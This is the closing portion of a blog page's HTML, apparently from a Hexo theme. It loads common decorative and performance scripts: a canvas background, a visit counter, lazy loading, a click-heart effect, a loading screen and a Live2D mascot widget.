opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/click_heart.js"></script><script>var endLoading = function () {
+  document.body.style.overflow = 'auto';
+  document.getElementById('loading-box').classList.add("loaded")
+}
+window.addEventListener('load',endLoading)</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
